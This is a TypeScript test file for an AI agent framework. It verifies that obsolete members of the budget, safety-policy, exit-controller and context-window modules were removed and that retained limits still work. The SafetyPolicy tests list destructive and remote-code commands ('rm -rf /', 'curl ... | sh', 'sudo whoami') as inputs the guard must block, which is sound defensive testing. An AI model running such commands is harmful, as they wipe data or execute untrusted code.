/**
 * W2a-07：策略、预算与退出控制收窄（L5-P44、L5-P45、L5-P08、L5-P09、L6-P15；用户 2026-10-20 答复②）。
 *
 * 本包只删成员与类型（运行时绑定与签名快照不变），所以按三层锁定：
 *   - 运行时断言：原型链、静态属性、对象键集合与实际判定结果；
 *   - 源码 AST 守护：src 中不再出现被删成员的标识符（字符串字面量与注释不计）；
 *   - 编译器探针：tsconfig 只包含 src/**，vitest 不做类型检查，类型成员的删除只能经 TypeScript
 *     compiler API 锁定。
 *
 * 保留项同样钉住，避免误删：策略层 maxSessionInputTokens 与屏蔽包装、BudgetControllerConfig.tracker、
 * SessionBudgetSummary.forcedSummarize（总控裁定第 7 节第 2 项：不归入本包）、CompactionConfig.thresholds、
 * QualityGatePolicy 类本身（②已答复，类保留供显式注入）。
 */
import { readdirSync, readFileSync, statSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import Logger from '@alembic/core/logging';
import ts from 'typescript';
import { afterEach, describe, expect, it, vi } from 'vitest';
import type { ExplorationTracker } from '../src/agent/context/ExplorationTracker.js';
import { ContextWindow } from '../src/agent/context/index.js';
import { BUDGET_POLICY_CODES, BudgetPolicy } from '../src/agent/policies/BudgetPolicy.js';
import { Policy, type StepState } from '../src/agent/policies/Policy.js';
import { PolicyEngine } from '../src/agent/policies/PolicyEngine.js';
import { QualityGatePolicy } from '../src/agent/policies/QualityGatePolicy.js';
import { SafetyPolicy } from '../src/agent/policies/SafetyPolicy.js';
import { AgentProfileCompiler } from '../src/agent/profiles/AgentProfileCompiler.js';
import { AgentProfileRegistry } from '../src/agent/profiles/AgentProfileRegistry.js';
import { AgentStageFactoryRegistry } from '../src/agent/profiles/AgentStageFactoryRegistry.js';
import {
  ANALYST_BUDGET,
  computeAnalystBudget,
  computeModuleAnalystBudget,
} from '../src/agent/prompts/insightAnalyst.js';
import { DiagnosticsCollector } from '../src/agent/runtime/DiagnosticsCollector.js';
import {
  createExitController,
  ExitController,
  type ExitControllerConfig,
  type ExitSignal,
} from '../src/agent/runtime/ExitController.js';
import type { LoopContext } from '../src/agent/runtime/LoopContext.js';

const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const SRC_ROOT = path.join(REPO_ROOT, 'src');

afterEach(() => {
  vi.restoreAllMocks();
});

function listTsFiles(dir: string): string[] {
  const out: string[] = [];
  for (const name of readdirSync(dir)) {
    const full = path.join(dir, name);
    if (statSync(full).isDirectory()) {
      out.push(...listTsFiles(full));
    } else if (name.endsWith('.ts')) {
      out.push(full);
    }
  }
  return out;
}

/**
 * src 中名为 names 之一的标识符（含私有 #name、属性名、解构名、getter 名）出现位置。
 * 字符串字面量与注释不是标识符节点，不计入：编译器告警读取的 'maxSessionTokens' 字面量合法存在。
 */
function srcIdentifierHits(names: readonly string[]): string[] {
  const wanted = new Set(names);
  const hits: string[] = [];
  for (const file of listTsFiles(SRC_ROOT)) {
    const text = readFileSync(file, 'utf8');
    const sourceFile = ts.createSourceFile(file, text, ts.ScriptTarget.Latest, true);
    const visit = (node: ts.Node) => {
      if (ts.isIdentifier(node) || ts.isPrivateIdentifier(node)) {
        const bare = node.text.startsWith('#') ? node.text.slice(1) : node.text;
        if (wanted.has(bare)) {
          const { line } = sourceFile.getLineAndCharacterOfPosition(node.getStart(sourceFile));
          hits.push(`${path.relative(REPO_ROOT, file)}:${line + 1} ${node.text}`);
        }
      }
      ts.forEachChild(node, visit);
    };
    visit(sourceFile);
  }
  return hits;
}

/** 编译器探针：探针放在 test/ 下的虚拟路径，按 NodeNext 解析 src 模块。 */
function typecheckProbe(name: string, text: string): string[] {
  const options: ts.CompilerOptions = {
    target: ts.ScriptTarget.ES2022,
    module: ts.ModuleKind.NodeNext,
    moduleResolution: ts.ModuleResolutionKind.NodeNext,
    strict: true,
    noEmit: true,
    skipLibCheck: true,
    types: [],
  };
  const probePath = path.join(REPO_ROOT, 'test', name);
  const host = ts.createCompilerHost(options);
  const baseGetSourceFile = host.getSourceFile.bind(host);
  const baseFileExists = host.fileExists.bind(host);
  const baseReadFile = host.readFile.bind(host);
  host.fileExists = (fileName) => fileName === probePath || baseFileExists(fileName);
  host.readFile = (fileName) => (fileName === probePath ? text : baseReadFile(fileName));
  host.getSourceFile = (fileName, languageVersion, onError, shouldCreate) =>
    fileName === probePath
      ? ts.createSourceFile(fileName, text, languageVersion, true)
      : baseGetSourceFile(fileName, languageVersion, onError, shouldCreate);
  const program = ts.createProgram([probePath], options, host);
  const sourceFile = program.getSourceFile(probePath);
  expect(sourceFile).toBeDefined();
  return [
    ...program.getSyntacticDiagnostics(sourceFile),
    ...program.getSemanticDiagnostics(sourceFile),
  ].map((diagnostic) => ts.flattenDiagnosticMessageText(diagnostic.messageText, '\n'));
}

// ── L5-P44：applyToConfig 链与 toGateConfig 删除 ──

describe('L5-P44 applyToConfig chain and toGateConfig are removed', () => {
  it.each([
    ['Policy', Policy],
    ['BudgetPolicy', BudgetPolicy],
    ['SafetyPolicy', SafetyPolicy],
    ['QualityGatePolicy', QualityGatePolicy],
    ['PolicyEngine', PolicyEngine],
  ] as const)('%s has no applyToConfig on its prototype chain', (_name, PolicyClass) => {
    expect('applyToConfig' in PolicyClass.prototype).toBe(false);
  });

  it('QualityGatePolicy has no toGateConfig but keeps its validateAfter thresholds', () => {
    const policy = new QualityGatePolicy({ minEvidenceLength: 5, minFileRefs: 1, minToolCalls: 1 });
    expect('toGateConfig' in policy).toBe(false);
    expect(policy.validateAfter({ reply: 'Inspect src/file.ts', toolCalls: [{}] })).toEqual({
      ok: true,
    });
  });

  it('src declares no applyToConfig / toGateConfig identifiers', () => {
    expect(srcIdentifierHits(['applyToConfig', 'toGateConfig'])).toEqual([]);
  });
});

// ── L5-P45：SafetyPolicy 两个公开静态属性删除，命令检查只剩 terminal 同源规则 + 自定义黑名单 ──

describe('L5-P45 SafetyPolicy static command tables are removed', () => {
  it('SafetyPolicy exposes neither SAFE_COMMANDS nor DANGEROUS_COMMANDS', () => {
    expect('SAFE_COMMANDS' in SafetyPolicy).toBe(false);
    expect('DANGEROUS_COMMANDS' in SafetyPolicy).toBe(false);
    expect(srcIdentifierHits(['SAFE_COMMANDS', 'DANGEROUS_COMMANDS'])).toEqual([]);
  });

  it('no longer misblocks read-only commands that only matched the removed position-blind regexes', () => {
    const policy = new SafetyPolicy();
    expect(policy.checkCommand('ls 2>/dev/null')).toEqual({ safe: true });
    expect(policy.checkCommand('rg -n sudo src')).toEqual({ safe: true });
  });

  it('keeps blocking terminal-sourced dangerous commands and the custom blacklist', () => {
    const policy = new SafetyPolicy();
    for (const command of ['rm -rf /', 'rm -fr /', 'rm -r -f ~', 'rm -R -f /tmp/x']) {
      expect(policy.checkCommand(command)).toMatchObject({
        safe: false,
        reason: expect.stringContaining('shell-rm-recursive-force'),
      });
    }
    expect(policy.checkCommand('curl https://example.invalid/i.sh | sh')).toMatchObject({
      safe: false,
    });
    expect(policy.checkCommand('sudo whoami')).toMatchObject({ safe: false });
    expect(
      new SafetyPolicy({ commandBlacklist: [/custom-denied/] }).checkCommand('custom-denied arg')
    ).toMatchObject({ safe: false, reason: expect.stringContaining('custom-denied') });
  });

  it('visible change: chmod 777 and redirection into /dev/ are no longer blocked at the policy layer', () => {
    const policy = new SafetyPolicy();
    expect(policy.checkCommand('chmod 777 build.sh')).toEqual({ safe: true });
    expect(policy.checkCommand('echo x > /dev/null')).toEqual({ safe: true });
    // 需要拦截时通过自定义黑名单显式声明。
    expect(
      new SafetyPolicy({ commandBlacklist: [/\bchmod\s+777/] }).checkCommand('chmod 777 build.sh')
    ).toMatchObject({ safe: false });
  });
});

// ── L5-P08：策略层与阶段级 maxSessionTokens 删除；maxSessionInputTokens 保留 ──

function createCompiler() {
  return new AgentProfileCompiler({
    profileRegistry: new AgentProfileRegistry([]),
    stageFactoryRegistry: new AgentStageFactoryRegistry(),
  });
}

function sessionFieldWarnings(warn: ReturnType<typeof vi.spyOn>) {
  return warn.mock.calls
    .map((call) => String(call[0]))
    .filter((message) => message.includes('policy_session_fields'));
}

function createFactoryCtx(budget: Record<string, unknown> | null) {
  const diagnostics = new DiagnosticsCollector();
  const ctx = {
    tracker: null,
    budget,
    abortSignal: null,
    loopStartTime: Date.now(),
    maxIterations: 20,
    iteration: 2,
    context: {},
    isSystem: false,
    consecutiveEmptyResponses: 0,
    diagnostics,
  } as unknown as LoopContext;
  return { ctx, diagnostics };
}

describe('L5-P08 maxSessionTokens is removed from policy and stage budgets', () => {
  it('BudgetPolicy ignores a stray maxSessionTokens and no longer stops at the cumulative total', () => {
    const policy = new BudgetPolicy({ maxSessionTokens: 1_000 } as never);
    expect('maxSessionTokens' in policy).toBe(false);
    expect('maxSessionTokens' in new BudgetPolicy()).toBe(false);
    expect(
      policy.validateDuring({
        iteration: 0,
        startTime: Date.now(),
        totalTokens: 1_400,
        totalInputTokens: 700,
      } as StepState)
    ).toEqual({ ok: true, action: 'continue' });
  });

  it('keeps the policy-level maxSessionInputTokens limit and its code', () => {
    const policy = new BudgetPolicy({ maxSessionInputTokens: 1_000 });
    expect(policy.maxSessionInputTokens).toBe(1_000);
    expect(
      policy.validateDuring({
        iteration: 0,
        startTime: Date.now(),
        totalTokens: 1_500,
        totalInputTokens: 1_200,
      } as StepState)
    ).toMatchObject({ ok: false, code: 'budget_session_input_tokens' });
  });

  it('BUDGET_POLICY_CODES and PolicyEngine.getBudget drop the session total entry', () => {
    expect(Object.keys(BUDGET_POLICY_CODES)).toEqual([
      'maxIterations',
      'timeout',
      'sessionInputTokens',
    ]);
    expect(Object.values(BUDGET_POLICY_CODES)).not.toContain('budget_session_tokens');
    const budget = new PolicyEngine([new BudgetPolicy({ maxSessionInputTokens: 900 })]).getBudget();
    expect(budget).not.toBeNull();
    expect(Object.keys(budget ?? {})).toEqual([
      'maxIterations',
      'maxTokens',
      'timeoutMs',
      'temperature',
      'maxSessionInputTokens',
    ]);
    expect(budget?.maxSessionInputTokens).toBe(900);
  });

  it('a run whose policy declared maxSessionTokens keeps running past the old cap', () => {
    const engine = new PolicyEngine([new BudgetPolicy({ maxSessionTokens: 1_000 } as never)]);
    const { ctx, diagnostics } = createFactoryCtx(engine.getBudget());

    const signal = createExitController(ctx, engine).checkBeforeIteration(ctx, {
      input: 700,
      output: 700,
    });

    expect(signal).toEqual({ action: 'continue' });
    expect(diagnostics.toJSON().warnings).toEqual([]);
  });

  it('a decision carrying the retired budget_session_tokens code is a plain policy_stop (no token grace)', () => {
    const forceTerminal = vi.fn();
    const tracker = {
      phase: 'SCAN',
      iteration: 0,
      totalSubmits: 0,
      isGracefulExit: false,
      isHardExit: false,
      tick: vi.fn(),
      shouldExit: vi.fn(() => false),
      forceTerminal,
      metrics: { phaseRounds: 0 },
    } as unknown as ExplorationTracker;
    const controller = new ExitController({
      tracker,
      effectiveTimeoutMs: 0,
      abortSignal: null,
      validateDuring: () => ({
        ok: false,
        reason: 'Budget: session token limit reached',
        code: 'budget_session_tokens',
      }),
      skipPolicyIterCheck: true,
      loopStartTime: Date.now(),
      maxIterations: 10,
    });

    const signal = controller.checkBeforeIteration(createFactoryCtx(null).ctx, {
      input: 0,
      output: 0,
    });

    expect(signal).toMatchObject({ action: 'exit', reason: 'policy_stop' });
    expect(forceTerminal).not.toHaveBeenCalled();
  });

  it('compiling a budget declaration with maxSessionTokens warns once that it was removed and is ignored', () => {
    const warn = vi.spyOn(Logger.getInstance(), 'warn').mockImplementation(() => undefined);

    const profile = createCompiler().compile({
      id: 'session-cap-profile',
      basePreset: 'chat',
      policies: [{ type: 'budget', maxIterations: 5, maxSessionTokens: 1_000 }],
    });

    const policy = profile.policies?.[0] as BudgetPolicy;
    expect(policy).toBeInstanceOf(BudgetPolicy);
    expect('maxSessionTokens' in policy).toBe(false);
    expect(
      policy.validateDuring({
        iteration: 0,
        startTime: Date.now(),
        totalTokens: 1_400,
      } as StepState)
    ).toEqual({ ok: true, action: 'continue' });
    const messages = sessionFieldWarnings(warn);
    expect(messages).toHaveLength(1);
    expect(messages[0]).toContain('maxSessionTokens=1000');
    expect(messages[0]).toContain('removed');
    expect(messages[0]).toContain('ignored');
  });

  it('the maxSessionInputTokens warning no longer claims the field is scheduled for removal', () => {
    const warn = vi.spyOn(Logger.getInstance(), 'warn').mockImplementation(() => undefined);

    createCompiler().compile({
      basePreset: 'chat',
      policies: [{ type: 'budget', maxSessionInputTokens: 800 }],
    });

    const messages = sessionFieldWarnings(warn);
    expect(messages).toHaveLength(1);
    expect(messages[0]).toContain('maxSessionInputTokens=800');
    expect(messages[0]).toContain('policy_session_limit_bypassed');
    expect(messages[0]).not.toMatch(/scheduled for removal|removed/);
  });

  it('ANALYST_BUDGET and the compute* results lose the key while maxSessionInputTokens stays numerically unchanged', () => {
    expect('maxSessionTokens' in ANALYST_BUDGET).toBe(false);
    expect(ANALYST_BUDGET.maxSessionInputTokens).toBe(216_000);

    const baseline = computeAnalystBudget(0);
    expect('maxSessionTokens' in baseline).toBe(false);
    expect(baseline.maxSessionInputTokens).toBe(216_000);

    const scaled = computeAnalystBudget(150, 20_000);
    expect('maxSessionTokens' in scaled).toBe(false);
    expect(scaled.maxSessionInputTokens).toBe(36 * Math.ceil(20_000 * 0.6));

    const moduleBudget = computeModuleAnalystBudget(5);
    expect('maxSessionTokens' in moduleBudget).toBe(false);
    expect(moduleBudget.maxSessionInputTokens).toBe(18 * Math.ceil(15_000 * 0.6));
  });

  it('the insight analyze stage neither falls back to nor merges a maxSessionTokens budget', () => {
    const registry = new AgentStageFactoryRegistry();
    const analyzeOf = (strategyContext?: Record<string, unknown>) =>
      (
        registry.build('generateDimensionPipeline', {
          params: { needsCandidates: true },
          context: strategyContext ? { strategyContext } : {},
        }) as Array<{ name: string; budget?: Record<string, unknown> }>
      ).find((stage) => stage.name === 'analyze');

    const fallback = analyzeOf();
    expect(fallback?.budget?.maxSessionInputTokens).toBe(216_000);
    expect(fallback?.budget && 'maxSessionTokens' in fallback.budget).toBe(false);

    const merged = analyzeOf({
      _computedBudget: {
        maxIterations: 40,
        maxSessionTokens: 777_600,
        maxSessionInputTokens: 576_000,
      },
    });
    expect(merged?.budget?.maxSessionInputTokens).toBe(576_000);
    expect(merged?.budget && 'maxSessionTokens' in merged.budget).toBe(false);
  });

  it('src declares no maxSessionTokens identifier (policy, controller, loop context, presets, micro stages)', () => {
    expect(srcIdentifierHits(['maxSessionTokens', 'ANALYST_SESSION_TOTAL_RATIO'])).toEqual([]);
  });
});

// ── L5-P09：ExitSignal.needsSummary 删除 ──

describe('L5-P09 ExitSignal no longer carries needsSummary', () => {
  function controllerWith(overrides: Partial<ExitControllerConfig> = {}) {
    return new ExitController({
      tracker: null,
      effectiveTimeoutMs: 0,
      abortSignal: null,
      validateDuring: () => ({ ok: true }),
      skipPolicyIterCheck: false,
      loopStartTime: Date.now(),
      maxIterations: 3,
      ...overrides,
    });
  }

  function trackerWith(overrides: Record<string, unknown>) {
    return {
      phase: 'SCAN',
      iteration: 4,
      totalSubmits: 1,
      isGracefulExit: false,
      isHardExit: false,
      tick: vi.fn(),
      shouldExit: vi.fn(() => false),
      forceTerminal: vi.fn(),
      metrics: { phaseRounds: 0 },
      ...overrides,
    } as unknown as ExplorationTracker;
  }

  function loopCtx(overrides: Record<string, unknown> = {}) {
    return {
      iteration: 1,
      isSystem: false,
      consecutiveEmptyResponses: 0,
      consecutiveAiErrors: 0,
      ...overrides,
    } as unknown as LoopContext;
  }

  const NO_USAGE = { input: 0, output: 0 };

  it('every exit-producing checkpoint returns a signal without needsSummary', () => {
    const aborted = new AbortController();
    aborted.abort();
    const signals: Array<[string, ExitSignal]> = [
      [
        'abort_signal',
        controllerWith({ abortSignal: aborted.signal }).checkBeforeIteration(loopCtx(), NO_USAGE),
      ],
      [
        'stage_timeout',
        controllerWith({
          effectiveTimeoutMs: 1_000,
          loopStartTime: Date.now() - 5_000,
        }).checkBeforeIteration(loopCtx(), NO_USAGE),
      ],
      [
        'tracker_exit',
        controllerWith({
          tracker: trackerWith({ shouldExit: vi.fn(() => true) }),
        }).checkBeforeIteration(loopCtx(), NO_USAGE),
      ],
      [
        'iteration_exhausted (before iteration)',
        controllerWith().checkBeforeIteration(loopCtx({ iteration: 4 }), NO_USAGE),
      ],
      [
        'policy budget_timeout',
        controllerWith({
          validateDuring: () => ({ ok: false, reason: 'timeout', code: 'budget_timeout' }),
        }).checkBeforeIteration(loopCtx(), NO_USAGE),
      ],
      [
        'policy_stop',
        controllerWith({
          validateDuring: () => ({ ok: false, reason: 'stop', code: 'custom_stop' }),
        }).checkBeforeIteration(loopCtx(), NO_USAGE),
      ],
      ['empty_response (null)', controllerWith().checkAfterLLM(null, loopCtx())],
      [
        'empty_response_terminal',
        controllerWith({
          tracker: trackerWith({ phase: 'SUMMARIZE', metrics: { phaseRounds: 2 } }),
        }).checkAfterLLM({ text: '', functionCalls: [] }, loopCtx()),
      ],
      ['empty_response', controllerWith().checkAfterLLM({ text: '' }, loopCtx())],
      [
        'iteration_exhausted (after tools)',
        controllerWith().checkAfterToolCalls(loopCtx({ iteration: 3 })),
      ],
      [
        'error_accumulated (unwired checkAfterAiError)',
        controllerWith().checkAfterAiError(
          { message: 'boom' },
          loopCtx({ consecutiveAiErrors: 2 })
        ),
      ],
    ];

    for (const [label, signal] of signals) {
      expect(signal.action, label).toBe('exit');
      expect(Object.hasOwn(signal, 'needsSummary'), label).toBe(false);
    }
  });

  it('src declares no needsSummary identifier', () => {
    expect(srcIdentifierHits(['needsSummary'])).toEqual([]);
  });
});

// ── L6-P15：CompactionConfig.enableL4LLM 删除，MODEL_CONTEXT_WINDOWS 改为模块私有 ──

describe('L6-P15 L4 switch and context-window table narrowing', () => {
  /** 投影接近预算的小窗口：L4 开关打开时 needsL4Compaction 为 true。 */
  function saturatedWindow(compactionConfig?: unknown): ContextWindow {
    const window = new ContextWindow(1_000, compactionConfig as never);
    window.appendUserMessage('initial analyze prompt');
    for (let index = 0; index < 4; index++) {
      window.appendAssistantWithToolCalls(null, [
        { id: `call-${index}`, name: 'code', args: { action: 'read', index } },
      ]);
      window.appendToolResult(`call-${index}`, 'code', `r${index}:${'x'.repeat(1900)}`);
    }
    window.compactIfNeeded();
    return window;
  }

  it('a stray enableL4LLM config is ignored: L4 starts off and only syncL4CompactionSwitch turns it on', () => {
    const window = saturatedWindow({ enableL4LLM: true });
    expect(window.needsL4Compaction()).toBe(false);
    window.syncL4CompactionSwitch(true, 'unit-test');
    expect(window.needsL4Compaction()).toBe(true);
  });

  it('MODEL_CONTEXT_WINDOWS is no longer a static member of ContextWindow', () => {
    expect('MODEL_CONTEXT_WINDOWS' in ContextWindow).toBe(false);
    expect(Object.getOwnPropertyNames(ContextWindow)).not.toContain('MODEL_CONTEXT_WINDOWS');
  });

  it('src declares no enableL4LLM identifier (config field or private field)', () => {
    expect(srcIdentifierHits(['enableL4LLM'])).toEqual([]);
  });
});

// ── 类型收窄的编译器探针 ──

describe('W2a-07 type narrowing compiler probe', () => {
  it('removed members are absent from the public types while retained members stay', () => {
    const diagnostics = typecheckProbe(
      'w2a-07-type-narrowing.probe.ts',
      [
        "import type { CompactionConfig, ContextWindow } from '../src/agent/context/ContextWindow.js';",
        "import type { BudgetPolicy, BudgetPolicyConfig } from '../src/agent/policies/BudgetPolicy.js';",
        "import type { Policy } from '../src/agent/policies/Policy.js';",
        "import type { PolicyEngine } from '../src/agent/policies/PolicyEngine.js';",
        "import type { QualityGatePolicy } from '../src/agent/policies/QualityGatePolicy.js';",
        "import type { SafetyPolicy } from '../src/agent/policies/SafetyPolicy.js';",
        "import type { BudgetControllerConfig, SessionBudgetSummary } from '../src/agent/runtime/BudgetController.js';",
        "import type { ExitSignal } from '../src/agent/runtime/ExitController.js';",
        "import type { LoopContext } from '../src/agent/runtime/LoopContext.js';",
        "import type { ANALYST_BUDGET } from '../src/agent/prompts/insightAnalyst.js';",
        'type Lacks<T, K extends PropertyKey> = K extends keyof T ? false : true;',
        // 删除项
        "export const policyApply: Lacks<Policy, 'applyToConfig'> = true;",
        "export const engineApply: Lacks<PolicyEngine, 'applyToConfig'> = true;",
        "export const gateConfig: Lacks<QualityGatePolicy, 'toGateConfig'> = true;",
        "export const safeCommands: Lacks<typeof SafetyPolicy, 'SAFE_COMMANDS'> = true;",
        "export const dangerousCommands: Lacks<typeof SafetyPolicy, 'DANGEROUS_COMMANDS'> = true;",
        "export const policyConfigTotal: Lacks<BudgetPolicyConfig, 'maxSessionTokens'> = true;",
        "export const policyGetterTotal: Lacks<BudgetPolicy, 'maxSessionTokens'> = true;",
        "export const engineBudgetTotal: Lacks<NonNullable<ReturnType<PolicyEngine['getBudget']>>, 'maxSessionTokens'> = true;",
        "export const controllerTotal: Lacks<BudgetControllerConfig, 'maxSessionTokens'> = true;",
        "export const analystTotal: Lacks<typeof ANALYST_BUDGET, 'maxSessionTokens'> = true;",
        "export const exitNeedsSummary: Lacks<ExitSignal, 'needsSummary'> = true;",
        "export const compactionL4: Lacks<CompactionConfig, 'enableL4LLM'> = true;",
        "export const windowTable: Lacks<typeof ContextWindow, 'MODEL_CONTEXT_WINDOWS'> = true;",
        // LoopContext 的 budget 带字符串索引签名：删除声明后该键退回 unknown。
        "type LoopTotal = LoopContext['budget']['maxSessionTokens'];",
        'export const loopTotal: unknown extends LoopTotal ? true : false = true;',
        // 保留项
        "export const policyConfigInput: Lacks<BudgetPolicyConfig, 'maxSessionInputTokens'> = false;",
        "export const engineBudgetInput: Lacks<NonNullable<ReturnType<PolicyEngine['getBudget']>>, 'maxSessionInputTokens'> = false;",
        "export const controllerTracker: Lacks<BudgetControllerConfig, 'tracker'> = false;",
        "export const summaryForced: Lacks<SessionBudgetSummary, 'forcedSummarize'> = false;",
        "export const compactionThresholds: Lacks<CompactionConfig, 'thresholds'> = false;",
        "export const analystInput: Lacks<typeof ANALYST_BUDGET, 'maxSessionInputTokens'> = false;",
        "export const exitAction: Lacks<ExitSignal, 'action'> = false;",
        '',
      ].join('\n')
    );
    expect(diagnostics).toEqual([]);
  }, 60_000);
});
